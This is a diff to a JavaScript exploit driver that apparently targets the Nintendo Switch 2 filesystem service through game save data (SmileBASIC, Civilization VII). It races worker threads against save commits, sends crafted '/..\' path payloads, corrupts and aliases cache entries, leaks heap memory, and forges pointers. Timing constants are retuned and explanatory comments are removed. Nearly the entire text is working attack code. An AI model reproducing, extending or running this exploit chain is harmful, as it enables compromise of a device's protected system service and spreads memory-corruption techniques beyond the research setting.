@@ -20,45 +20,20 @@ async function main() {
   // Fixed geometry and bounded attempts from the Switch 2 hardware run.
   const probeReadSize = 0x10000, markerOffset = 0x2340;
   // Measured fs general-heap cost of the pinning storage on this target:
-  // 13616 on the SmileBASIC reference, 6960 on the Civ7 BC save.
+  // 13616 on the SmileBASIC reference, 7040 on the Civ7 20.4.0 save.
   const pinningAllocationBytes = target.pinningAllocationBytes ?? 13616;
-  // Bounded general-heap allocation jitter on this target. The Civ7 BC fs
-  // allocates in a granule that occasionally shifts a retained-cache wave's
-  // general-heap counter by +/-192 bytes (same unit as the pin-cost +192).
-  // The leak-phase restoration/geometry guards tolerate up to this much drift
-  // and still fail loudly on anything larger. 0 (SmileBASIC default) keeps the
-  // reference strict.
+  
+  // Heap drift tolerance comes from the target profile (Civ7: 192 bytes).
   const heapJitterBytes = target.heapJitterBytes ?? 0;
+  // DIAGNOSTIC ONLY (off by default): send the trigger without waiting for the
+  // hole to finish. Tests whether the trigger is serialized behind the commit.
+  const diagTriggerEarly = process.env.NS2_DIAG_TRIGGER_EARLY === '1';
+  
   const trialRange = 0x600000, cacheReadSize = 0x200000, fragmentCount = 16;
-  // 2026-11-10 Civ7 re-tune: metadataAttempts 4 -> 12. The Civ7 background
-  // interference intermittently reverts the falsified cache entry (alias and
-  // bucket-period requalifications read ordinary content instead), and the
-  // SmileBASIC budget of 4 retries is too small on this target.
   const minimumCacheHeld = 0x2810, metadataAttempts = 12;
-  // Confirmed race-window hits required per field copy. Each leak install is 7
-  // copies and the full leak/address/range/fragmentation chain runs several
-  // installs, so with the ~20%-per-wave window hit rate this constant is the
-  // dominant multiplier on total wave count. It is a confidence redundancy, not
-  // a correctness requirement (every retry writes the identical prefix, so only
-  // an accepted window commits, and the native readback afterward is the proof).
-  // Lowered to 1 on the fragile Civ7 console to ~halve exposure to the sporadic
-  // mid-sweep app fault; SmileBASIC keeps the 2-hit margin.
   const fieldCopies = target.fieldCopies ?? 2;
   const waveAttempts = 30;
   const plannerCycle = 0x28000;
-  // EXPERIMENT (Civ7 BC save, 2026-11-02): the clean in-window `positive`
-  // overwrite returns fs 2-6006 on this save while `extent-present` (a valid
-  // deep path through the same gap reassembly) returns 0. The positive filler
-  // is one unbroken ~9020-byte run of 'B' with no separators, i.e. a single
-  // path component far past the 255-char max; the reference (SmileBASIC) save
-  // tolerated it, this one appears to reject it before the gap-alias is
-  // reached. Setting NS2_POSITIVE_FILL_SEGMENT=<n> breaks the filler into
-  // separated <=n-byte components (a '/' every n+1 bytes) up to markerOffset,
-  // leaving the aliased target at markerOffset and the '/..\' prefix unchanged.
-  // Unset (0) = exact SmileBASIC-proven behavior. If this clears 6006 but the
-  // canary still never changes, the next lever is the target position itself
-  // (markerOffset 0x2340 is a SmileBASIC-era constant and also the cache-alias
-  // targetOffset, so moving it means re-tuning the cache plan too).
   const positiveFillSegment = process.env.NS2_POSITIVE_FILL_SEGMENT ?
     Number(process.env.NS2_POSITIVE_FILL_SEGMENT) : 0;
   const canonicalPlanner = require('./cache-address-plan.cjs');
@@ -82,12 +57,7 @@ async function main() {
   const holeFinished = b + 0x2a10, earlyHole = b + 0x2a14, holeDecision = b + 0x2a18;
   const zeroByte = b + 0x2a1c;
   const gates = [], workers = [], created = [], storages = [];
-  // 2026-11-10 Civ7 re-tune: retire the parked gap workers before the memory
-  // stage. They are only needed for the race waves; parked raw-svc threads
-  // with crafted frames are a candidate trigger for the Civ7 background
-  // activity that kills the app ~11.5 s after the last wave (RUN 14/21/22).
-  // The identical sequence already runs in the finally block; this moves it
-  // earlier so serve() starts with a clean thread table.
+  
   async function retireParkedWorkers() {
     if (!s.threads.size || !(await s.ready())) return;
     const parked = workers.filter(worker => !worker.joined && s.threads.has(worker.thread));
@@ -137,15 +107,12 @@ async function main() {
   const marker = 'SPAN_MARKER', absent = 'SPAN_ABSENT';
   const segments = Array.from({length: 3}, (_, i) => 'S' + i + '_' + Date.now());
   const extent = (0x2440);
-  // The Civ7 BC save accepts at most ~8 MiB of writes per file (a second
-  // 8 MiB write fails even after Flush), so the gap arena is halved from the
-  // SmileBASIC reference's 16 MiB to the largest write that qualifies here.
   const writeSize = 0x800000, writeData = b + 0x1000000, output = b + 0xa00000;
   const requests = Array.from({length: 13}, (_, i) => b + 0x10000 + i * 4096);
   const preReleaseBuffer = b + 0x1d000, clearReportBuffer = b + 0x1e000, pinBuffer = b + 0x1f000;
   const triggerInput = b + 0x30000;
   const tailInputs = Array.from({length: 4}, (_, i) => b + 0x32000 + i * 0x2000);
-  const report = {session: live.session, scratch, canary, extent, markerOffset,
+  const report = {session: live.session, scratch, canary, extent, markerOffset, diagTriggerEarly,
     probeReadSize, trialRange, cacheReadSize, fragmentCount, minimumCacheHeld,
     metadataAttempts, fieldCopies, waveAttempts, plannerCycle,
     started: new Date().toISOString(), cases: []};
@@ -195,11 +162,8 @@ async function main() {
   }
   async function reserveGroupAttempt() {
     const owner = await domain.openDomain(s, 'Gap manager group');
-    group = {owner, objects: [], rootCopy: null, outer: null};
-    group.rootCopy = domain.oneHandle(await domain.copyObject(s, owner, owner.root));
+    group = {owner, objects: [], outer: null};
     group.before = await memory();
-    // The RPC batches still execute in order. Each request owns a separate
-    // page because SendSyncRequest overwrites that page with its response.
     const reservationPages = Buffer.alloc(59 * 4096);
     const managerPacket = domain.wire.domain(owner.root, 1200);
     const addresses = Array.from({length: 59}, (_, i) => b + 0x60000 + i * 4096);
@@ -228,7 +192,9 @@ async function main() {
     const converted = await domain.send(s, 'Wrap gap group', owner.handle, domain.wire.control(0));
     check(!converted.result, 'Group wrapping failed');
     group.outer = converted.data.readUInt32LE();
-    await s.write(requests[9], domain.wire.closeObject(group.outer));
+    
+    await s.write(requests[7], domain.wire.closeObject(group.outer));
+
     const handle = Buffer.alloc(4);
     handle.writeUInt32LE(owner.handle);
     await s.write(b + 0x2a00, handle);
@@ -238,8 +204,6 @@ async function main() {
       try {return await reserveGroupAttempt();}
       catch (error) {
         if (!error.reservationAccounting || attempt === 2) throw error;
-        // Nothing in this group has been corrupted, and no worker has started
-        // this wave. Release the owned group before measuring a fresh one.
         check(!s.threads.size, 'Cannot retry a reservation while workers are active');
         await closeGroup();
         const observation = report.reservationChecks.at(-1);
@@ -261,7 +225,7 @@ async function main() {
         group.objects.pop();
       }
     }
-    for (const handle of [group.rootCopy, group.owner.handle]) if (s.handles.has(handle)) await s.close(handle);
+    if (group.owner && s.handles.has(group.owner.handle)) await s.close(group.owner.handle);
     group = null;
   }
 
@@ -287,7 +251,6 @@ async function main() {
     const cores = Array.from({length: 32}, (_, i) => 1n << BigInt(i)).filter(bit => bit & mask);
     report.mountPlan = {save: 'save', temporary: 'save'};
     saved = await mounted.cloneMountedFilesystem(s, 'save');
-    // Both logical paths use this same save mount and run serially on the host.
     temporary = saved;
     root = await s.openService('fsp-srv');
     check(!(await s.ipc('Initialize gap root', root, 1, u64(0), {pid: true})).result, 'Root initialization failed');
@@ -302,7 +265,6 @@ async function main() {
     check(storageSize >= BigInt(probeReadSize), 'Own content is too small');
     report.storageSize = storageSize.toString();
     if (originalRom) check(await domain.storageSize(s, originalRom) === storageSize, 'Mounted RomFS size differs');
-    // This owned copy was used only to compare sizes; release it before cloning.
     await s.close(originalRom);
     originalRom = null;
     cloneMonitor = require('./monitored-clones.cjs').createMonitor(s, {save});
@@ -310,7 +272,8 @@ async function main() {
     await cloneMonitor.initialize();
     const savedPointer = await cloneMonitor.request(saved, 3, 'Query base save pointer-buffer size');
     check(savedPointer.data.readUInt16LE() === 2048, 'Save pointer-buffer profile differs');
-    const topology = await require('./compact-clients.cjs').createClients({saved, root, storage, base: b, clone});
+    const topology = await require('./compact-clients.cjs').createClients({saved, root, storage, base: b, clone,
+      triggerFrom: process.env.NS2_DIAG_TRIGGER_SOURCE === 'root' ? 'root' : 'saved'});
     const {clients, savedTrigger, tmpTrigger} = topology;
     report.cloneTopology = topology.report;
     const finalPointer = await cloneMonitor.request(savedTrigger, 3, 'Query final trigger pointer-buffer size');
@@ -319,10 +282,6 @@ async function main() {
     check(cloneMonitor.state.cleanedUp, 'Clone monitor cleanup did not verify');
     await save();
     await runControl.checkpoint('before scratch writes');
-    // The mount's outstanding-dirty cap is ~8-12 MiB: commit_data alone
-    // saturates it, so no pad file can stretch the Commit further. The race
-    // window (commit duration minus hole-read duration) is maximized by the
-    // 8 MiB commit file and the smallest qualifying hole read.
     const requiredSaveSpace = writeSize + 0x400000 + 0x10000;
     const space = await normal(saved, 11, '/');
     const free = space.result ? 0n : space.data.readBigUInt64LE();
@@ -375,8 +334,6 @@ async function main() {
         plannerCycle: addressPlan.cycle, headerFormat: addressPlan.headerFormat || 'original',
         target: addressPlan.target, base: addressPlan.base, entryOffset: addressPlan.entryOffset,
         readOffset: addressPlan.readOffset, header: addressPlan.bytes.toString('hex')};
-      // Read the ordinary content before installing a raw pointer. Combined
-      // acquisition requalifies the cache alias after these reads.
       await s.call('memset', output, 0xa5, 0x4000);
       const ordinary = await s.ipc('Read the ordinary address-window control', storage, 0,
         Buffer.concat([u64(addressPlan.readOffset), u64(0x4000)]),
@@ -409,34 +366,52 @@ async function main() {
       [{address: b + 0x45000, size: 16}, {address: b + 0x46000, size: 0x7f0}]);
     for (const bytes of [guardRequest, fillerRequest]) check((await domain.send(s,
       'Ordinary gap path control', saved, bytes)).canonicalResult === 0x202, 'Path control differs');
-    for (let i = 0; i < 1; i++) storages.push(domain.oneHandle(
-      await s.ipc('Reserve own gap content ' + i, root, 200)));
-    const roles = ['commit', 'hole', 'tail0', 'tail1', 'tail2', 'tail3', 'canary',
-      'filler0', 'filler1', 'release', 'guard0', 'guard1', 'trigger'];
-    const delays = ([0, 300000, 350000, 450000, 550000, 650000, 1700000, 2000000, 2150000, 2800000]);
+    
+    storages.push(storage);
+    
+    const roles = ['commit', 'hole', 'tail0', 'tail1', 'tail2', 'tail3', 'canary', 'release', 'guard1', 'trigger'];
+    
+    // FIXED TIMING:
+    // canary: 1.7ms (must be pending when pin arrives at 2.0ms)
+    // release: 2.0ms (pin created)
+    // guard1: 2.4ms
+    // trigger: 4.5ms (hits gap as hole finishes)
+    const delays = ([0, 1500000, 350000, 450000, 550000, 650000, 1700000, 2000000, 2400000, 2800000]);
+    
     report.workerDelaysNs = delays;
     const plans = roles.map((role, i) => {
       const steps = [wait(master)];
-      if (i < 10) steps.push(sleep(delays[i]));
-      else if (i < 12) steps.push(wait(groupReleased), sleep((i - 10) * 150000));
-      else steps.push(sleep(2400000), wait(groupReleased), wait(guardLaunched), sleep(400000),
-        copyWord(spacingDecision, holeFinished, 'sampleMinimumSpacing'), wait(holeDone));
-      if (i === 9) steps.push(tick('pinStart'), send(pinBuffer, root, 'pin'), tick('pinEnd'));
-      if (i === 9) steps.push(tick('clearStart'), send(clearReportBuffer, root, 'clearReport'), tick('clearEnd'),
+      
+      if (role === 'release') steps.push(sleep(2000000));
+      else if (role === 'guard1') steps.push(sleep(2400000));
+      // Original upstream schedule: sample the spacing decision only after the
+      // group is released, the guard has launched and the hole has finished.
+      else if (role === 'trigger') steps.push(sleep(2400000), wait(groupReleased), wait(guardLaunched), sleep(400000),
+        copyWord(spacingDecision, holeFinished, 'sampleMinimumSpacing'),
+        ...(diagTriggerEarly ? [] : [wait(holeDone)]));
+      else steps.push(sleep(delays[i] || 0));
+
+      if (role === 'release') steps.push(tick('pinStart'), send(pinBuffer, root, 'pin'), tick('pinEnd'));
+      // The row read after the wave (beforeRelease.memory) needs this preRelease send.
+      if (role === 'release') steps.push(tick('clearStart'), send(clearReportBuffer, root, 'clearReport'), tick('clearEnd'),
         tick('memoryStart'), send(preReleaseBuffer, root, 'preRelease'), tick('memoryEnd'));
-      if (i === 11) steps.push(copyWord(earlyHole, holeFinished, 'sampleReceiveOrder'), signal(guardLaunched));
-      if (i === 12) steps.push(copyWord(completedDecision, completedFlag, 'sampleCompleted'),
+
+      if (role === 'guard1') steps.push(copyWord(earlyHole, holeFinished, 'sampleReceiveOrder'), signal(guardLaunched));
+      
+      if (role === 'trigger') steps.push(copyWord(completedDecision, completedFlag, 'sampleCompleted'),
         copyWord(holeDecision, earlyHole, 'sampleEarlyHole'),
-        // A zero-length copy preserves the payload. A one-byte copy makes
-        // it an ordinary empty path before the kernel receives the buffer.
         call(memcpy.offset, [triggerInput, zeroByte, {u32: completedDecision}, 0], 'abortCompleted'),
         call(memcpy.offset, [triggerInput, zeroByte, {u32: holeDecision}, 0], 'abortEarlyHole'),
         call(memcpy.offset, [triggerInput, zeroByte, {u32: spacingDecision}, 0], 'abortMinimumSpacing'));
+      
       steps.push(tick('start'), send(requests[i], clients[i], role), tick('end'));
-      if (i === 1) steps.push(setByte(holeFinished, 1, 'holeFinished'), signal(holeDone));
-      if (i === 9) steps.push(signal(groupReleased));
-      if (i === 0 || i >= 2 && i <= 8 || i === 10 || i === 11)
+      
+      if (role === 'hole') steps.push(setByte(holeFinished, 1, 'holeFinished'), signal(holeDone));
+      if (role === 'release') steps.push(signal(groupReleased));
+      
+      if (['commit', 'tail0', 'tail1', 'tail2', 'tail3', 'canary'].includes(role))
         steps.push(setByte(completedFlag, 1, 'protectedRequestFinished'));
+      
       return steps;
     });
 
@@ -470,11 +445,6 @@ async function main() {
       } else {
         if (isPositive) {
           payload.fill('B', 0, extent);
-          // Experimental filler-splitting (see positiveFillSegment above): a
-          // '/' every (n+1) bytes keeps each filler component <= n chars so a
-          // parser that rejects an oversized single component still walks to
-          // the aliased target. Stops before markerOffset; selectedDirectory
-          // supplies its own leading '/', so the target boundary is intact.
           if (positiveFillSegment > 0)
             for (let at = positiveFillSegment; at < markerOffset; at += positiveFillSegment + 1)
               payload[at] = 0x2f;
@@ -501,13 +471,14 @@ async function main() {
       const packets = [packet(10), packet(0, Buffer.concat([u64(0), u64(readSize)]),
         {receive: [{address: output, size: readSize, mode: 1}]})];
       for (let i = 0; i < 4; i++) packets.push(pathPacket(1002, Buffer.alloc(0), tailInputs[i], pieces[i + 1].length));
-      packets.push(pathPacket(7, Buffer.alloc(0), b + 0x40000, canarySize), Buffer.from(fillerRequest),
-        Buffer.from(fillerRequest), null, Buffer.from(guardRequest), Buffer.from(guardRequest),
+      packets.push(pathPacket(7, Buffer.alloc(0), b + 0x40000, canarySize),
+        null, 
+        Buffer.from(guardRequest), 
         pathPacket(7, Buffer.alloc(0), triggerInput, 0x800));
       await s.measure('requests:' + profile, async () => {
         const writes = packets.flatMap((bytes, i) => bytes ? [{address: requests[i],
           bytes: context(bytes, i === 0 || i >= 2 && i < 6 ? 3 : 9)}] : []);
-        writes.push({address: requests[9], bytes: domain.wire.closeObject(group.outer)},
+        writes.push({address: requests[7], bytes: domain.wire.closeObject(group.outer)},
           {address: preReleaseBuffer, bytes: context(packet(1009))},
           {address: clearReportBuffer, bytes: context(packet(1009))});
         writes.push({address: pinBuffer, bytes: context(packet(createPin ? 200 : 1009))});
@@ -524,8 +495,6 @@ async function main() {
               stack: b + 0x400000 + i * 0x15000 + 0x1000,
               stackBytes: target.thread.stackBytes} :
             target.thread?.mode === 'raw-svc' ? {
-              // Stacks must not overlap the snapshot arena at b+0x500000+i*0x40000:
-              // a launch-time stack memset would corrupt another worker's snapshot.
               stack: b + 0x840000 + i * 0x15000,
               stackBytes: target.thread.stackBytes} : null);
         }
@@ -546,7 +515,8 @@ async function main() {
       const replies = (await s.measure('replies:' + profile, () =>
         s.readOwnedMany(ipcSteps.map(({step}) => ({address: step.args[0], bytes: 256})))));
       for (const [replyIndex, {worker, index, step}] of ipcSteps.entries()) {
-        check(worker.results[index] === 0n, 'Native gap transport failed at ' + step.name);
+        check(worker.results[index] === 0n, 'Native gap transport failed at ' + step.name +
+          ' (send result ' + String(worker.results[index]) + ')');
         const bytes = (replies[replyIndex]);
         const reply = step.name === 'release' ? null : response(bytes);
         if (step.name === 'pin' && createPin) {
@@ -564,7 +534,7 @@ async function main() {
       group.outer = null;
       group.objects.length = 0;
       const after = await memory(), trigger = rows.find(row => row.role === 'trigger');
-      const heldPaths = rows.filter(row => ['canary', 'filler0', 'filler1', 'guard0', 'guard1'].includes(row.role));
+      const heldPaths = rows.filter(row => ['canary', 'guard1'].includes(row.role));
       const beforeRelease = rows.find(row => row.role === 'preRelease');
       const canaryRow = rows.find(row => row.role === 'canary');
       const overlap = qualifyOverlap(rows);
@@ -589,16 +559,6 @@ async function main() {
       await save();
       console.log(JSON.stringify(row));
       if (candidateHandle && !row.restored) {
-        // Local retune 2026-11-09/10 (see port-patches/README.md):
-        // (a) -28336 / -32736 counter drops always coincide with
-        // nativeGuard.earlyHole=1 (hole beat guard1) — the wave's own gap
-        // bookkeeping freed early; the retained candidate cache entry is
-        // untouched and retry waves re-baseline group.before, so treat as a
-        // copyField retry. (b) RUN 15/30 both saw a small -704 (0x2C0) drop
-        // with earlyHole=0 at deep cache phases (combined-leak / alias-offset);
-        // that is fs-session bookkeeping noise, not a placement failure, so a
-        // small drift (<=0x800) is retryable as well. Anything else keeps the
-        // author's fatal stop-overwrites path.
         const drift = {profile, expected: row.baseline, observed: row.after,
           difference: row.after - row.baseline, earlyHole: Boolean(row.nativeGuard?.earlyHole)};
         drift.retryable = Boolean(drift.earlyHole) || Math.abs(drift.difference) <= 0x800;
@@ -621,13 +581,6 @@ async function main() {
       await closeGroup();
       if (createPin) {
         const pinRow = rows.find(r => r.role === 'pin');
-        // The pinning storage is created on this (first) wave and must land
-        // inside the canary's pending window at the expected cost. Both are a
-        // per-boot timing race (~0-3 ms margins, plus occasional +192 cost
-        // jitter), so report them as flags instead of throwing: the caller
-        // re-rolls an unlucky first wave (releases the pin, re-dirties, retries)
-        // and asserts both once a qualifying wave lands. A budget-exhausted
-        // caller loop still fails loudly on the assert below.
         row.pinWindowOk = canaryRow.startUs < pinRow.startUs && pinRow.endUs < canaryRow.endUs;
         row.pinCostOk = row.newPersistentBytes === pinningAllocationBytes;
       }
@@ -639,8 +592,6 @@ async function main() {
         (isPositive || customPayload) && r.result === 0x2eea02), 'Unexpected filler result');
       const metadataCanaryMiss = customPayload && row.changedPaths.length === 1 &&
         row.changedPaths[0] === 'canary' && canaryRow.result === 0x2eea02;
-      // A metadata copy can land on the still-owned path canary. Let the
-      // caller retry this measured miss after checking the file below.
       if (!isPositive && !metadataCanaryMiss)
         check(!canaryRow.result && row.canaryType === 1, 'Control changed the canary');
       if (row.triggerAborted) check(trigger.result === report.abortControlResult, 'Native abort differs from the empty-path control');
@@ -669,8 +620,6 @@ async function main() {
           batch.validatedWaves++;
           if (!hasWindow(row)) continue;
           if (profile === 'extent-present' && !row.selectedMarker) continue;
-          // An unchanged owned canary can be retried before a cache exists.
-          // Other changed paths still fail the placement checks below.
           if (profile === 'positive' && row.canaryResult === 0 && row.canaryType === 1 &&
               row.changedPaths.length === 0) continue;
           batch.status = 'selected';
@@ -702,11 +651,6 @@ async function main() {
       check(row.selectedMarker && hasWindow(row), 'The interleaved input extent did not requalify');
     }
 
-    // The first wave creates the pinning storage and must land the canary
-    // window + cost (see the createPin block in wave()). That is a per-boot
-    // race with ~0-3 ms margins; a single miss used to abort the whole
-    // acquisition. Re-roll like retryWave does for the other profiles: on a
-    // miss, release the pin just created and try again, up to waveAttempts.
     let abortControl;
     for (let attempt = 0; attempt < waveAttempts; attempt++) {
       abortControl = await wave('abort-control', probeReadSize);
@@ -739,8 +683,6 @@ async function main() {
           positive.receiveOrderMarginUs >= 300;
         report.markerSelected = waveHistory.markerHit(positive);
         await requirePositiveMarker(report.markerSelected);
-        // The locator already traversed and checked the full input extent.
-        // Keep its allocation sequence intact through the directory controls.
         await checkExtent();
         if ((report.markerSelected)) {
           const repeated = await retryWave('positive');
@@ -761,8 +703,6 @@ async function main() {
           const cache = report.cacheAlias = {targetOffset: markerOffset, clean: true, outputPoison: 0xa5, aliasOffset};
           const hash = bytes => crypto.createHash('sha256').update(bytes).digest('hex');
           async function readStorage(handle, size, offset = 0, poison = cache.outputPoison) {
-            // Distinguish a real copy from a successful call that leaves the
-            // receive buffer untouched after a malformed cache lookup.
             await s.call('memset', output, poison, size);
             const reply = await s.ipc('Read candidate content', handle, 0, Buffer.concat([u64(offset), u64(size)]),
               {receive: [{address: output, size, mode: 1}]});
@@ -813,10 +753,6 @@ async function main() {
                   for (const key of Object.keys(guards)) if (row.nativeGuard?.[key]) guards[key]++;
                 }
                 if (row.changedPaths.length) misses++;
-                // Every retry writes the same prefix. An aborted copy or a
-                // known path-canary miss is not evidence against an earlier
-                // accepted window. Count accepted windows without requiring
-                // consecutive placement; native readback remains the proof.
                 const accepted = hasWindow(row) && row.preReleaseUsed >= minimumCacheHeld && row.changedPaths.length === 0;
                 if (accepted) confirmed++;
               }
@@ -846,7 +782,6 @@ async function main() {
             prefix.writeBigUInt64LE(BigInt(aliasOffset));
             prefix.writeBigUInt64LE(0x4141414141414141n, 8);
             prefix[0x10] = 1;
-            // The last NUL leaves dirty=0 and preserves the genuine handle.
             const steps = canonicalPlanner.nulWrites(prefix);
             check(steps.length === 7, 'Combined prefix needs exactly seven copies');
             cache.combinedPrefix = prefix.toString('hex');
@@ -854,8 +789,6 @@ async function main() {
           }
           const restoreAlias = async () => {
             {
-              // The modified entry is still clean. Invalidation also handles
-              // an ordinary-content miss that inserted a new entry.
               const reset = await s.ipc('Reset the clean alias cache', candidateHandle, 5,
                 Buffer.concat([u64(2), u64(0), u64(storageSize)]));
               (cache.invalidateResults ||= []).push(reset.canonicalResult);
@@ -897,11 +830,7 @@ async function main() {
               selectedAlias: cache.selectedAlias, normalContent: cache.normalContent,
               outputFile: aliased.bytes ? cache.outputFile : null});
             await save();
-            // Keep this exact entry and buffer for the extended read. An
-            // ordinary-content miss still takes the existing restore path.
             if ((!cache.selectedAlias)) await restoreCandidate();
-            // Retry only a clean ordinary-content miss, after invalidation
-            // and the original-prefix check. Keep the same owned array alive.
             if (cache.selectedAlias || !cache.normalContent) break;
           }
           check((cache.selectedAlias), 'Combined acquisition did not obtain the clean alias');
@@ -910,8 +839,6 @@ async function main() {
               trialRange, readSize: cacheReadSize, readOffset: leakOffset,
               logicalRange: ('0x4141414141414141'),
               clean: true, outputPoison: cache.outputPoison};
-            // Keep this entry clean: its original allocation size is not yet
-            // read from native memory, so no content Flush is appropriate.
             restoreCandidate = async () => {
               {
                 const invalidated = await s.ipc('Invalidate the widened clean cache', candidateHandle, 5,
@@ -956,17 +883,12 @@ async function main() {
                   outputFile: beforeRelease.bytes ? range.beforeReleaseFile : null,
                   sha256: beforeRelease.bytes ? range.beforeReleaseSha256 : null});
                 await save();
-                // Adjacent cached blocks can match ordinary content too.
-                // Require a matching first block and a later real difference;
-                // do not require that difference at exactly byte 0x4000.
                 if (!beforeRelease.result && range.beforeReleasePrefixMatches && range.beforeReleaseFirstDifference >= 0x4000) break;
                 check(!beforeRelease.result && range.beforeReleaseFirstDifference === -1,
                   'Neighbor-release control is not a qualified over-read');
                 await restoreAlias();
               }
               const releasedCaches = range.releasedCaches = {before: await memory(), results: []};
-              // These owners are all read-only content storages. Their cache
-              // buffers can be freed without closing any app-owned object.
               for (const handle of new Set([storage, pinHandle, ...storages, originalRom].filter(Boolean))) {
                 check(handle !== candidateHandle, 'Cannot invalidate the active leak owner');
                 const reply = await s.ipc('Release neighboring clean content cache', handle, 5,
@@ -1013,8 +935,6 @@ async function main() {
                 check(item.prefixMatches && item.firstDifference >= 0x4000,
                   'The widened candidate was replaced during fragmentation');
               }
-              // Existing storage objects keep general-heap geometry fixed.
-              // Alternate allocations, then invalidate each clean owner.
               const neighbors = ([pinHandle, storages[0]]);
               const blocks = (fragmentCount);
               for (let i = 0; i < blocks; i++) for (const handle of neighbors) {
@@ -1061,8 +981,6 @@ async function main() {
             await fs.writeFile(evidenceFile, JSON.stringify(evidence, null, 2) + '\n', {mode: 0o600});
             await prepareAddressControl(evidence, evidenceFile);
 
-            // A short input exercises native UTF-8 validation without an
-            // overflow. Requalify the owned cache after these ordinary calls.
             const prefix = Buffer.from('/..\\');
             const invalid = await raw(saved, 7, Buffer.concat([prefix, Buffer.from([0xff, 0])]));
             const encodedBytes = Buffer.concat([prefix, addressPlan.writes[0].bytes, Buffer.from([0])]);
@@ -1089,10 +1007,6 @@ async function main() {
             check(report.cacheAddress.aliasRequalification.selected, 'The owned cache alias did not survive address preparation');
           }
           if ((cache.selectedAlias) && report.cacheAddress.periodControlHex !== prime.bytes.toString('hex')) {
-            // 2026-11-10 Civ7 re-tune: bucket-period re-selection was a single
-            // shot (SmileBASIC geometry, RUN 24 w2 failed here at probe:1011).
-            // Mirror the alias loop: retry a clean ordinary-content miss up to
-            // metadataAttempts times, restoring the candidate in between.
             report.cacheAddress.periodAttempts = [];
             for (let attempt = 0; ; attempt++) {
               if (attempt && attempt % metadataAttempts === 0) {
@@ -1147,8 +1061,6 @@ async function main() {
               memoryNeedsRestore = false;
               await save();
             }
-            // Never flush or invalidate a redirected dirty entry. Clearing
-            // its valid byte makes finalization skip the synthetic pointer.
             restoreCandidate = async () => {
               if (report.retainedMemory?.promoted) {
                 check(memoryContext, 'Retained memory context is unavailable');
@@ -1212,9 +1124,6 @@ async function main() {
               await save();
             }
             {
-              // 2026-11-10 diagnostic: idle (default 10 s, no console traffic) before
-              // serve(). Override with NS2_SERVE_DELAY_MS. If the app dies during this
-              // window, the crash snapshot will carry serveDelay without doneAt.
               const plannedIdle = Number(process.env.NS2_SERVE_DELAY_MS || 10000);
               report.serveDelay = {startedAt: Date.now(), plannedMs: plannedIdle};
               await save();
@@ -1223,8 +1132,6 @@ async function main() {
               await save();
             }
             {
-              // 2026-11-10 Civ7 re-tune: retire the parked gap workers before
-              // serve() so the memory stage starts with a clean thread table.
               await retireParkedWorkers();
             }
             {
@@ -1234,9 +1141,6 @@ async function main() {
               memoryContext = {s, live, report, file, label, save, storageSize: Number(storageSize),
                 initialPlan: addressPlan, copyField, readStorage, candidateHandle, input: b + 0xb0000, put,
                 runControl};
-              // 2026-11-10 diagnostic: NS2_SKIP_SERVE=1 bypasses serve() entirely so the
-              // probe proceeds to restoreCandidate/cleanup. Bisects whether the ~+1.5s
-              // post-delay app death is caused by serve() or by any follow-up console op.
               if (process.env.NS2_SKIP_SERVE === '1') {
                 report.serveSkipped = {at: new Date().toISOString(), reason: 'NS2_SKIP_SERVE'};
                 await save();
